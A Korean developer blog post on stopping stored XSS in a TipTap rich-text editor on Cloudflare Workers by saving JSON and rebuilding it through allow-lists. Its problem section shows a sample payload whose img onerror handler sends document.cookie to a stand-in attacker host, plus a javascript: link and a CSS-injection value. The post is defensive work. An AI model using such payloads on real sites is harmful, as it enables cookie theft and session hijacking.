---
title: "Cloudflare Workers에서 DOMPurify 없이 TipTap 본문 정제하는 방법"
date: "2026-11-13"
description: "DOM이 없는 Workers 환경에서 TipTap 공지 본문을 HTML 대신 JSON으로 저장하고, 허용 목록으로 다시 만들어 XSS를 막은 과정"
tags: ["security", "xss", "tiptap", "prosemirror", "nextjs", "cloudflare", "workers", "d1"]
thumbnail: "/assets/thumbnails/cs/tiptap-cloudflare-workers.webp"
relatedPosts:
  - "Cloudflare Workers에 어울리는 로그인 방식을 찾아보자! PBKDF2와 HMAC"
  - "Cloudflare Workers — K-컬처 페스티벌 배포기"
---

'2026 서울주거포럼' 홈페이지에는 관리자가 공지를 쓰는 에디터가 있다. textarea 정도로 구현해도 간단한 공지는 가능하지만, 더 가독성있고 컨텐츠 풍부한 공지를 위해서는 소제목, 굵은 글씨, 색상, 목록, 이미지가 있는 리치 텍스트 에디터가 필요하다. 

오픈소스 에디터인 **TipTap**을 선택했는데 TipTap을 고른 이유는 크게 두 가지다.

- **필요한 기능만 골라 붙일 수 있다.** 폰트 굵기, 링크, 이미지 같은 기능이 확장 단위로 나뉘어 있어서, 공지에 필요한 것만 붙이면 된다. 에디터가 만들 수 있는 내용이 그만큼 좁아지니 뒤에서 거를 범위도 함께 줄어든다.
- **UI를 직접 만들 수 있다.** TipTap은 툴바 같은 화면을 기본으로 주지 않아서, 관리자 화면 디자인에 맞춰 버튼과 툴바를 직접 짤 수 있다.


K-컬처 프로젝트에서는 에디터의 `getHTML()`로 HTML 문자열을 받아 `sanitize-html`모듈로 거른 뒤 DB에 저장했다. 허용할 태그와 속성, 스타일 값을 옵션으로 적어 두는 방식이다. 흔히 쓰는 방식이고 동작에도 문제는 없었는데, 쓰면서 몇 가지가 걸렸다.

- **에디터 설정과 정제 옵션이 따로 놂** 에디터에 기능을 하나 붙이면, 그 기능이 어떤 HTML 태그와 속성을 만드는지 확인해서 정제 옵션에 따로 추가해야 했다.
- **HTML 모양을 일일이 맞춰야 함** 같은 색상도 브라우저가 `#ff0000`을 `rgb(255, 0, 0)`으로 바꿔서 내보내는 식이라, 나올 수 있는 형태를 다 생각해서 허용 규칙을 짜야 했다.
- **결국엔 문자열을 다시 해석하는 일** 에디터 안에서는 이미 구조가 정해진 문서인데, 그걸 HTML로 풀었다가 서버에서 다시 파싱해서 검사하는 셈이다.

TipTap은 화면에는 HTML로 보여 주지만, 안쪽에서는 본문을 `{ "type": "paragraph", "content": [...] }`처럼 블록 종류가 적힌 JSON 객체로 들고 있다. 따라서 이번에는 HTML로 바꾸지 않고, **이 JSON 객체를 그대로 저장하고 검사하는 방식**을 써 보기로 했다.

관리자가 쓴 본문은 공개 공지 상세 페이지에서 HTML로 출력된다.

이 HTML을 어떻게 안전하게 만들 것인가.

이 내용은 [포트폴리오의 서울주거포럼 프로젝트 글](/portfolio/seoul-house-forum)에서 "공지 본문 필터링"이라는 항목으로 한 번 다뤘었다. 다만 프로젝트 소개 글이다 보니 허용 목록 코드 몇 줄과 "저장할 때, 출력할 때 두 번 거른다" 정도로만 짧게 정리하고 넘어갔다.

왜 DOMPurify를 안 썼는지, 속성 값은 어떤 기준으로 걸렀는지, `javascript:` 링크나 base64 이미지는 정확히 어디서 막히는지에 대해선 자세히 다루지 않았기에 기억해 둘 겸, 나중에 다시 꺼내 볼 겸 이번 글에서 코드와 함께 자세히 정리해 두려 한다.

프로젝트 환경은 아래와 같다.

- 프레임워크: Next.js 16 (App Router)
- 배포: Cloudflare Workers (OpenNext)
- DB: Cloudflare D1
- 에디터: TipTap 3

<callout title="이 글에서 다루는 것">

- 관리자 전용 에디터도 XSS 경로가 되는 이유
- Workers에서 DOMPurify를 쓰기 어려운 이유
- HTML 대신 JSON을 저장하고, 허용 목록으로 트리를 다시 만드는 방법
- 저장할 때와 출력할 때 두 번 검사하는 구조

</callout>

---

# 0. WYSIWYG 에디터와 TipTap

본론으로 들어가기 전에, 이 글에서 다루는 에디터가 어떤 종류인지부터 짚고 가자.

> **WYSIWYG (What You See Is What You Get)**
>
> "보이는 대로 결과가 나온다"는 뜻이다. 글을 쓰는 화면과 실제로 출력되는 화면이 같은 에디터를 말한다. 렌더링이 되어 보이는 글 모습이 편집할 때도 똑같이 보이는 것.
>
> 또 다른 방식으로는 마크다운 에디터가 있다. `**굵게**`처럼 기호로 서식을 적고, 결과는 미리보기나 렌더링을 거쳐야 보인다. 개발자에겐 익숙하지만, 공지를 올리는 운영자에게 마크다운 문법을 배우라고 할 수는 없다. 서울주거포럼 공지 에디터를 WYSIWYG로 만든 이유도 이에 속한다.

<br/>

## WYSIWYG 에디터는 어떻게 만들어질까

브라우저에는 HTML 요소를 바로 편집할 수 있게 해 주는 `contenteditable` 속성이 있다.

```html
<div contenteditable="true">여기를 클릭하면 바로 글을 쓸 수 있다</div>
```

<bookmark url="https://developer.mozilla.org/ko/docs/Web/HTML/Reference/Global_attributes/contenteditable"></bookmark>

예전 WYSIWYG 에디터는 이 위에 `document.execCommand("bold")`와 같은 브라우저 명령을 얹어 만들었다. 하지만 이 방식에는 문제가 많았다.

- **브라우저마다 결과 HTML이 다르다.** 같은 굵게 명령에도 어떤 브라우저는 `<b>`, 어떤 브라우저는 `<strong>`이나 `<span style="font-weight: bold">`와 같이 다른 결과 화면을 보였다.
- **결과물이 HTML 문자열이다.** 붙여넣기를 하면 외부 문서의 HTML이 거의 그대로 들어온다. XSS 문제가 바로 여기서 시작된다.
- **`execCommand`는 이제 표준에서 더 이상 권장하지 않는 기능(deprecated)이다.**

그래서 요즘 에디터들은 다른 방식을 쓴다. 문서를 HTML이 아니라 **자체 데이터 구조(문서 모델)** 로 들고 있고, 화면은 그 모델을 `contenteditable` 위에 그려 주기만 한다. 사용자가 HTML을 직접 고치는 게 아닌 모델을 고치고, 바뀐 모델을 다시 화면에 반영한다. ProseMirror, Lexical, Slate 같은 라이브러리가 이 방식이다.

<br/>

## TipTap과 ProseMirror

> **ProseMirror**
>
> 문서 모델 방식의 에디터를 만들기 위한 라이브러리다. 문서에 어떤 노드와 서식이 올 수 있는지 **스키마**로 정하고, 스키마에 맞지 않는 내용은 모델에 들어오지 못한다. 기능이 강력한 대신 그대로 쓰기엔 설정할 게 많다.

<bookmark url="https://prosemirror.net/examples/"></bookmark>

> **TipTap**
>
> ProseMirror를 쓰기 편하게 감싼 에디터 프레임워크다. 굵게, 링크, 이미지 같은 기능을 확장(Extension) 단위로 붙였다 뗐다 할 수 있다. 툴바나 버튼 같은 UI는 기본으로 주지 않아서 화면은 프로젝트 디자인에 맞게 직접 만들어야한다. React, Vue용 패키지도 있다.

<bookmark url="https://tiptap.dev/docs/examples"></bookmark>

이 글에서 중요한 건 TipTap이 **문서 모델 방식**이라는 점이다. 화면에는 HTML처럼 보여도 안쪽에는 스키마를 따르는 JSON 트리가 있다. 

---

# 1. 문제점

## 관리자용 에디터도 위험하다

에디터는 관리자만 쓴다. 그래서 처음엔 "관리자가 일부러 스크립트를 넣을 일은 없으니 괜찮지 않나" 싶었다.

그런데 에디터를 쓰는 사람과 결과물을 보는 사람이 다르다. 관리자가 쓴 본문은 사이트에 들어오는 모든 방문자가 본다. 관리자가 나쁜 마음을 먹지 않아도 위험한 내용이 들어올 수 있는 경우의 수는 많다고 판단했다.

- **붙여넣기:** 외부 문서나 웹페이지에서 복사한 내용에 `<script>`, `onerror` 같은 이벤트 속성, `javascript:` 링크가 섞여 있을 수 있다.
- **API 직접 호출:** 에디터 화면을 거치지 않고 관리자 API에 직접 요청을 보내면, 에디터 쪽에서 걸어 둔 제한은 아무 의미가 없다.
- **관리자 계정 탈취:** 계정이 유출되면 그 계정으로 쓴 글은 방문자 전체에게 퍼진다.

가령 이런 HTML이 본문에 그대로 저장되면

```html
<p>공지입니다</p>
<img src="x" onerror="fetch('https://abusingSite.example/?c=' + document.cookie)">
<a href="javascript:alert(1)">자세히 보기</a>
```

방문자가 공지를 여는 순간 이미지 로딩이 실패하면서 `onerror`가 실행되고, 링크를 누르면 fetch 스크립트가 돈다. 이런 걸 **저장형 XSS(Stored XSS)** 라고 한다.

결국 브라우저 쪽 에디터를 믿지 않고, **서버에서 본문을 정제해야 했다.**

<br/>

## Workers에는 DOM이 없음

HTML 정제라고 하면 보통 **DOMPurify**부터 떠올린다.

하지만 DOMPurify는 브라우저의 DOM API로 HTML을 파싱하고 정리하는 라이브러리다. 브라우저에선 그냥 돌지만, 서버에서 쓰려면 `jsdom` 같은 DOM 구현을 같이 붙여야 한다(`isomorphic-dompurify`).

Cloudflare Workers 런타임에는 DOM이 없다. jsdom을 함께 번들링하면 Worker 번들이 커지고, 요청마다 DOM을 만드는 만큼 CPU 시간도 더 쓴게 된다. 이전 프로젝트에서 Workers CPU 시간 문제가 있었어서 최대한 자원을 아껴야한다는 마음이 컸다(테스트용 무료 플랜이긴 했지만).

물론 `sanitize-html`처럼 DOM 없이 문자열 파서로 도는 라이브러리도 있고, 앞서 말한 것처럼 K-컬처 프로젝트에서는 실제로 이걸 썼다. 다만 이 방식도 HTML을 다시 파싱하고, 에디터 설정과 정제 옵션을 따로 맞춰야 하는 건 마찬가지였다.

**HTML 문자열을 받아서 정제하는 방식 자체가 이 환경과 잘 맞지 않았다.** 그래서 문제를 조금 바꿔 보기로 했다.

---

# 2. HTML 대신 JSON을 저장한다

## TipTap은 문서를 JSON으로도 다룬다

앞에서 본 것처럼 TipTap은 화면에는 HTML로 보이지만, 안쪽에서는 문서를 **노드 트리**로 구성돼있다. 그리고 `editor.getJSON()`으로 이 트리를 그대로 꺼낼 수 있다.

```json
{
  "type": "doc",
  "content": [
    {
      "type": "paragraph",
      "content": [
        { "type": "text", "text": "공지", "marks": [{ "type": "bold" }] }
      ]
    }
  ]
}
```

구조를 보자

- **node:** 문단, 제목, 목록, 이미지처럼 문서를 이루는 블록이다. `type`으로 종류를 구분한다.
- **attrs:** 노드에 붙은 속성이다. 제목의 레벨, 이미지의 `src` 같은 것들이다.
- **marks:** 글자에 입히는 서식이다. 굵게, 기울임, 링크, 글자색 등이 여기 들어간다.
- **content:** 자식 노드 배열이다. 이게 반복되면서 트리가 된다.

HTML은 문자열이라 안에 뭐가 있는지 알려면 파싱을 해야 한다. 반면 JSON은 이미 `type`과 `attrs`가 나눠져 있다. **DOM 없이 객체를 순회하는 것만으로 무엇이 들어 있는지 검사할 수 있다.** 이게 이 방식을 고른 가장 큰 이유다.

<br/>

## D1에는 JSON과 순수 텍스트를 함께 저장

공지 테이블에는 json과 text 본문 컬럼을 두 개 뒀다.

```sql
CREATE TABLE notices (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT NOT NULL,
  content_json TEXT NOT NULL,
  content_text TEXT NOT NULL DEFAULT '',
  ...
);
```

- `content_json`: 에디터 JSON을 문자열로 저장한다. 화면 출력과 수정 화면에서 쓴다.
- `content_text`: 서식을 다 뺀 텍스트만 저장한다. 본문 검색에서 쓰려고 분리함.

JSON 문자열에 `LIKE` 검색을 걸면 `"type":"paragraph"` 같은 키 이름까지 검색에 걸려 버린다. 따라서 검색용 텍스트는 저장할 때 따로 뽑아 뒀다.

```ts
export function richTextToPlainText(doc: JSONContent): string {
  const parts: string[] = [];
  const walk = (node: JSONContent) => {
    // 텍스트만 따로 배열에 수집
    if (node.type === "text" && node.text) parts.push(node.text);
    // 자식 노드가 있으면 walk 재귀로 돌림
    node.content?.forEach(walk);
    // 다른 항목이 나오면 공백만 추가
    if (node.type === "paragraph" || node.type === "heading" || node.type === "listItem") parts.push(" ");
  };
  walk(doc);
  // 문자열 하나로 반환
  return parts.join("").replace(/\s+/g, " ").trim();
}
```

트리를 돌면서 `text` 노드의 텍스트만 모은다. 문단, 제목, 목록 항목이 끝날 때 공백을 하나 넣는데, 이게 없으면 "첫 문단" 다음 "둘째 문단"이 "첫 문단둘째 문단"처럼 붙어버린다.

다만 이렇게 텍스트를 저장용으로 따로 저장하면 단점도 있다.

- **같은 내용을 두 번 저장한다.** 본문 글자가 JSON 안에 한 번, 검색용 컬럼에 한 번 들어가서 저장 공간을 그만큼 더 쓰게 된다.
- **두 컬럼을 항상 같이 고쳐야 한다.** 한쪽만 바뀌면 화면에 보이는 내용과 검색되는 내용이 달라진다. 그래서 등록과 수정 모두 같은 입력 파서에서 두 값을 한 번에 만들게 했다.
- **검색 자체가 빨라지지는 않는다.** `LIKE '%검색어%'`는 인덱스를 못 타서 공지를 처음부터 끝까지 훑는다. 공지 수가 많지 않아 지금은 문제가 없지만, 글이 많아지면 D1의 전문 검색(FTS5) 같은 대체를 따로 생각해봐야 한다.

---

# 3. 같은 스키마를 쓰는 에디터와 렌더러

TipTap에서 **스키마**는 "이 에디터에 어떤 노드와 서식이 있을 수 있는가"를 정한 목록이다. 확장(Extension)을 하나 붙일 때마다 스키마에 노드나 서식이 추가된다.

이 확장 목록을 함수 하나로 만들고, 에디터(클라이언트)와 HTML 렌더러(서버)가 둘 다 이 함수를 쓰게 했다.

```ts
export const HEADING_LEVELS = [2, 3, 4] as const;

export function createRichTextExtensions(): Extensions {
  return [
    StarterKit.configure({
      heading: { levels: [...HEADING_LEVELS] },
      link: {
        openOnClick: false,
        autolink: true,
        defaultProtocol: "https",
        protocols: ["http", "https", "mailto", "tel"],
        HTMLAttributes: { rel: "noopener noreferrer nofollow", target: "_blank" },
      },
    }),
    TextStyle,
    Color,
    FontSize,
    Highlight.configure({ multicolor: true }),
    TextAlign.configure({ types: ["heading", "paragraph"] }),
    Image.configure({ inline: false, allowBase64: false }),
  ];
}
```

설정 몇 가지를 짚어 보면

- **heading levels `[2, 3, 4]`:** 공지 페이지에서 `h1`은 공지 제목이 이미 쓰고 있다. 본문 안에 `h1`이 또 생기지 않도록 2~4만 허용했다.
- **link protocols:** 링크로 허용할 프로토콜이다. `javascript:` 는 제외.
- **link HTMLAttributes:** 렌더링할 때 모든 링크에 `rel="noopener noreferrer nofollow"`와 `target="_blank"`를 붙인다. 새 창으로 열린 페이지가 `window.opener`로 원래 페이지를 건드리지 못하게 막는 용도다.
- **allowBase64: false:** 이미지를 base64 문자열로 본문에 박아 넣지 못하게 한다. 이미지는 업로드해서 경로로만 넣는다.

관리자 공지 작성 화면에 들어가는 에디터 컴포넌트(`RichTextEditor`)도 이 함수를 그대로 쓴다. 툴바와 본문 입력 영역, 이미지를 붙여넣거나 끌어다 놓으면 업로드한 뒤 본문에 넣어 준다. 내용이 바뀔 때마다 `getJSON()`으로 꺼낸 JSON을 부모(공지 작성 폼)에 넘기고, 폼은 이 JSON을 그대로 API로 쏜다.

```tsx
const editor = useEditor({
  extensions: createRichTextExtensions(),
  content: initialContent ?? "",
  immediatelyRender: false,
  onUpdate: ({ editor: updated }) => onChange(updated.getJSON()),
});
```

`useEditor`는 TipTap의 React 패키지(`@tiptap/react`)가 제공하는 훅이다. `extensions`, `content`, `onUpdate` 같은 옵션과 `getJSON()`도 TipTap에서 정해 둔 것이다.

이렇게 묶어 두면 장점이 하나 생긴다. **렌더러는 스키마에 없는 노드를 출력할 방법 자체가 없다.** 누군가 JSON에 `{ "type": "script" }`를 넣어도 렌더러는 출력할 수 없다.

참고로 `immediatelyRender: false`는 Next.js에서 TipTap을 쓸 때 서버 렌더링 결과와 클라이언트 결과가 달라지는 하이드레이션 오류를 피하려고 넣은 옵션이다.

---

# 4. 허용 목록으로 트리 재구성

실제 정제가 일어나는 부분이다.

들어온 JSON에서 **허용 목록에 있는 것만 골라서 새 트리를 만든다.** 처음 보는 속성이나 노드는 새 트리에 옮겨지지 않으니 자연스럽게 사라진다.

## 허용 목록

```ts
const ALLOWED_NODES = new Set([
  "doc", "paragraph", "text", "heading",
  "bulletList", "orderedList", "listItem",
  "blockquote", "horizontalRule", "hardBreak",
  "codeBlock", "image",
]);

const ALLOWED_MARKS = new Set([
  "bold", "italic", "underline", "strike",
  "code", "link", "textStyle", "highlight",
]);
```

- 노드 12종: 위 스키마에서 실제로 쓰는 노드만 넣었다.
- 서식 8종: 마찬가지로 툴바에서 쓸 수 있는 서식만 넣었다.

<br/>

## 노드 정제 (sanitizeNode)

```ts
const MAX_TEXT_LENGTH = 50_000;
const MAX_DEPTH = 12;

function sanitizeNode(node: JSONContent, depth: number): JSONContent | null {
  const type = String(node?.type);
  // 노드 허용 리스트에 없거나 재귀가 MAX DEPTH 이상이면 컷
  if (!ALLOWED_NODES.has(type) || depth > MAX_DEPTH) return null;

  if (type === "text") {
    // 텍스트가 아니거나 빈 텍스트면 컷
    if (typeof node.text !== "string" || node.text.length === 0) return null;
    // 서식을 하나씩 검사하고, 통과 못 한 서식(null)은 제외
    const marks = (node.marks ?? []).map(sanitizeMark).filter((mark) => mark !== null);
    // 텍스트는 바로 내보내준다.
    return { type, text: node.text.slice(0, MAX_TEXT_LENGTH), ...(marks.length ? { marks } : {}) };
  }

  // 아래의 노드 속성 검사 함수로 이미지 주소가 안전하지 않으면 null이 오고, 이미지 노드 자체를 버린다
  const attrs = sanitizeNodeAttrs(type, node.attrs);
  if (attrs === null) return null;


  // 자식 노드들도 검사
  const content = Array.isArray(node.content)
    ? node.content.map((child) => sanitizeNode(child, depth + 1)).filter((child) => child !== null)
    : undefined;

  return {
    type,
    ...(Object.keys(attrs).length ? { attrs } : {}),
    ...(content && content.length ? { content } : {}),
  };
}
```

주석으로 남기긴 했지만 흐름을 보자

1. 노드 `type`이 허용 목록에 없거나, 트리 뎁스가 12단계보다 깊으면 `null`을 돌려 버린다.
2. `text` 노드면 글자를 50,000자로 자르고, 서식(marks)을 하나씩 검사한다.
3. 그 외 노드면 속성을 검사하고, 자식 노드를 같은 함수로 재귀 정제한다.
4. 마지막에 `type`, 검사를 통과한 `attrs`, 정제된 `content`만 담은 **새 객체**를 돌려준다.

깊이 제한을 둔 건 목록 안에 목록, 그 안에 또 목록을 수천 단계로 쌓은 JSON을 보내면 재귀가 그만큼 돌기에 막대해져버린다. 공지에서 12단계 넘게 중첩될 일은 없으니 넉넉하게 잡았다.

글자 수 50,000자는 본문 전체가 아니라 **`text` 노드 하나당** 최대치다. 본문 전체 크기는 요청 크기 쪽에서 따로 막아야 한다.

<br/>

## 노드 속성 검사

위에서 type과 attributes를 받아 수행하는 속성 검사 함수다.

```ts
const ALIGNMENTS = new Set(["left", "center", "right", "justify"]);

function sanitizeNodeAttrs(type: string, attrs: Record<string, unknown> = {}) {
  const clean: Record<string, unknown> = {};
  // 타입이 p나 h인 동시에, 정렬 속성이 있을 경우
  if ((type === "paragraph" || type === "heading") && ALIGNMENTS.has(String(attrs.textAlign))) {
    clean.textAlign = attrs.textAlign;
  }
  // h 타입만 있을 경우, 허용된 level이 아니면 기본값으로
  if (type === "heading") {
    const level = Number(attrs.level);
    clean.level = (HEADING_LEVELS as readonly number[]).includes(level) ? level : HEADING_LEVELS[0];
  }
  // 순서 리스트 경우
  if (type === "orderedList") {
    const start = Number(attrs.start);
    clean.start = Number.isInteger(start) && start > 0 && start < 10_000 ? start : 1;
  }
  // 이미지인 경우 src 검사 진행
  if (type === "image") {
    if (!isSafeImageSrc(attrs.src)) return null;
    clean.src = attrs.src;
    clean.alt = pickString(attrs.alt, 200);
    clean.title = pickString(attrs.title, 200);
  }
  return clean;
}
```

빈 객체 `clean`을 만들고, 노드 종류별로 **알고 있는 속성만** 검사해서 옮긴다.

- 정렬, 제목 레벨, 목록 시작 번호는 허용된 값이 아니면 기본값으로 바꾼다. 글 자체를 버릴 정도의 문제는 아니기에 텍스트는 남긴다.
- 이미지는 `src`가 안전하지 않으면 `null`을 돌려서 **이미지 노드 자체를 버린다.**

`onclick`이나 `style` 같은 속성이 `attrs`에 들어 있어도, 이 함수는 쳐다보지도 않는다. `clean`에 옮겨지지 않으니 그냥 사라진다.

<br/>

## 서식 검사 (sanitizeMark)

```ts
const COLOR_PATTERN = /^(#[0-9a-fA-F]{3,8}|rgba?\(\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*(,\s*(0|1|0?\.\d+)\s*)?\))$/;
const FONT_SIZE_PATTERN = /^(1[0-9]|[2-6][0-9]|7[0-2])px$/;

function sanitizeMark(mark: { type?: unknown; attrs?: Record<string, unknown> }) {
  const type = String(mark.type);
  if (!ALLOWED_MARKS.has(type)) return null;
  const attrs = mark.attrs ?? {};

  // 링크 검사 후 반환
  if (type === "link") {
    return isSafeLinkHref(attrs.href) ? { type, attrs: { href: attrs.href } } : null;
  }
  // 서식 적용해서 반환
  if (type === "textStyle") {
    const clean: Record<string, unknown> = {};
    if (typeof attrs.color === "string" && COLOR_PATTERN.test(attrs.color)) clean.color = attrs.color;
    if (typeof attrs.fontSize === "string" && FONT_SIZE_PATTERN.test(attrs.fontSize)) clean.fontSize = attrs.fontSize;
    return Object.keys(clean).length > 0 ? { type, attrs: clean } : null;
  }
  if (type === "highlight") {
    const color = typeof attrs.color === "string" && COLOR_PATTERN.test(attrs.color) ? attrs.color : null;
    return { type, attrs: { color } };
  }
  return { type };
}
```

`textStyle`은 렌더링될 때 `<span style="color: ...; font-size: ...">` 형식으로 나온다. 값을 그대로 통과시키면 `red; background: url(https://abusingSite.example/track)` 같은 값으로 스타일을 이어 붙일 수 있다. 따라서 정해진 형식만 정규식으로 통과시켰다.

- **색상:** `#fff`, `#1a2b3c` 같은 hex, 또는 `rgb(...)`, `rgba(...)`만 통과한다.
- **글자 크기:** `10px`부터 `72px`까지만 통과한다.

굵게, 기울임처럼 속성이 없는 서식은 `{ type }`만 돌려준다. 혹시 속성이 딸려 와도 버려진다.

<br/>

